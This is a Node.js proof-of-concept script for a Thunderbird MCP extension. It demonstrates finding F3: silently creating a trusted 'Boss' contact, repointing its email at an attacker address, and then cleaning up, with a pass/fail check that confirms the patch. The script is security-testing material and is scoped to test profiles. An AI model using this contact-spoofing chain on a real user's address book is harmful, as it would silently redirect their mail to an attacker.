#!/usr/bin/env node
/**
 * PoC for F3: silent contact spoofing.
 *
 * On an UNPATCHED build, an MCP caller can create or edit any contact in any
 * address book with no UI confirmation. The classic attack is to repoint a
 * trusted contact ("Boss") at an attacker address so the user's future
 * replies are silently misrouted. This script demonstrates that attack
 * chain.
 *
 * On a PATCHED build (with `extensions.thunderbird-mcp.blockContactWrites`
 * at its default value of true), createContact/updateContact/deleteContact
 * all return an error and no address book is modified.
 *
 * The "attacker" address is attacker@dummy.invalid (RFC 6761 reserved). The
 * PoC creates a brand-new test contact, attempts to repoint it, then
 * cleans up. Run against a test Thunderbird profile only.
 */
'use strict';

const { callTool, banner, log, loadConnection } = require('./_client.cjs');

const TEST_DISPLAY_NAME = 'POC-F3-Boss-DELETE-ME';
const TEST_REAL_EMAIL = 'boss@dummy.invalid';
const TEST_ATTACKER_EMAIL = 'attacker@dummy.invalid';

async function main() {
  banner('F3 PoC: contact-spoof via updateContact');

  log('Step 1: create a fresh test contact ("Boss").');
  let created;
  try {
    created = await callTool('createContact', {
      email: TEST_REAL_EMAIL,
      displayName: TEST_DISPLAY_NAME,
    });
  } catch (e) {
    if (/blocks contact writes/i.test(e.message)) {
      log(`\n[ FIX CONFIRMED ] createContact refused on the patched build:`);
      log(`  ${e.message}`);
      log(`  No address book was modified; F3 attack chain is closed at write time.`);
      process.exit(0);
    }
    // Anything that looks like a transport / discovery failure should
    // bubble up to the top-level catch (exit 99), not be reclassified
    // as "unexpected server response" (exit 3).
    if (e && e.jsonrpcError) {
      log(`\nUnexpected server-side error from createContact: ${e.message}`);
      process.exit(3);
    }
    throw e;
  }
  if (created && created.error) {
    if (/blocks contact writes/i.test(created.error)) {
      log(`\n[ FIX CONFIRMED ] createContact refused on the patched build:`);
      log(`  ${created.error}`);
      log(`  F3 attack chain is closed at write time.`);
      process.exit(0);
    }
    log(`\nUnexpected error: ${created.error}`);
    process.exit(3);
  }

  const contactId = created.id;
  log(`  Created contact id=${contactId} email=${created.email}`);

  log('\nStep 2: silently repoint "Boss" at the attacker address.');
  log(`  This is the F3 attack: rewrite ${TEST_REAL_EMAIL} -> ${TEST_ATTACKER_EMAIL}.`);
  let updated;
  try {
    updated = await callTool('updateContact', {
      contactId,
      email: TEST_ATTACKER_EMAIL,
    });
  } catch (e) {
    log(`\nServer-side error during update (this would be expected on the patched build):`);
    log(`  ${e.message}`);
    log('\nCleaning up the test contact and exiting.');
    await safeDelete(contactId);
    process.exit(1);
  }
  if (updated && updated.error) {
    log(`\nupdateContact returned an error (this would be expected on the patched build):`);
    log(`  ${updated.error}`);
    log('\nCleaning up the test contact and exiting.');
    await safeDelete(contactId);
    process.exit(1);
  }

  log(`\n[ VULNERABLE ] updateContact succeeded:`);
  log(`  ${JSON.stringify(updated, null, 2)}`);
  log(`\n  The contact "${TEST_DISPLAY_NAME}" now points at ${TEST_ATTACKER_EMAIL}.`);
  log(`  Any future reply the user composes by typing "Boss" into the To field`);
  log(`  would silently route to the attacker. Cleaning up the test contact now.`);

  await safeDelete(contactId);
  log('\nDone. Install the patched .xpi and re-run to confirm F3 is blocked.');
  process.exit(1); // exit non-zero so CI / wrappers can tell "unpatched"
}

async function safeDelete(contactId) {
  try {
    const del = await callTool('deleteContact', { contactId });
    log(`  Cleanup: ${JSON.stringify(del)}`);
  } catch (e) {
    log(`  Cleanup failed: ${e.message}. Please remove "${TEST_DISPLAY_NAME}" manually from Thunderbird.`);
  }
}

if (process.env.NODE_TEST_CONTEXT) {
  // Discovered by `node --test`. This is a MANUAL security PoC: it talks to a
  // live Thunderbird profile and signals patched/vulnerable through semantic
  // process.exit() codes, so it is not a unit test. Register a skipped test
  // (with a reason) instead of letting the connection error surface as a suite
  // failure. Run it standalone — `node test/poc/f3-contact-spoof.cjs` — to
  // actually exercise the F3 chain.
  const { test } = require('node:test');
  let reason = 'manual PoC — run standalone against a live Thunderbird test profile';
  try { loadConnection(); } catch { reason = 'no live Thunderbird MCP connection'; }
  test('F3 PoC: contact-spoof (manual)', { skip: reason }, () => {});
} else {
  main().catch((e) => {
    process.stderr.write(`PoC failed: ${e.message}\n`);
    process.exit(99);
  });
}
